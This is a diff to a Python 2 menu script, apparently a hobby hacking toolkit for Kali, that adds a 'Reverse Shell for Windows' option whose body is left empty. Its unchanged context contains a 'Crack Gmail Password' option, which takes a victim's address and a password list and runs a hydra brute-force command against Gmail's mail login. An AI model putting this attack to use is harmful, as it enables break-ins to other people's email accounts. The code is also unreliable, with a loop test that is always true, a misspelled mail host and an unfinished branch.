@@ -6,8 +6,9 @@ def choose():
    print "2. Fully Update Kali"
    print "3. Genarate Password List"
    print "4. Crack Gmail Password"
+   print "5. Creat a Revearse Shell for Windows"
 option = input(">")
-while option != 1 or 2 or 3 or 4:
+while option != 1 or 2 or 3 or 4 or 5:
   print"INVALID OPTION"
   choose()
  if option == 1:
@@ -83,3 +84,5 @@ if option == 4:
    victim = raw_input("Victim: ")
    lc = raw_input("File Location of Password List: ")
    os.system('hydra -S -l '+victim+' -P '+lc+' -v -V -e ns -s 465 stmp.gmail.com stmp')
+if option == 5:
+                 
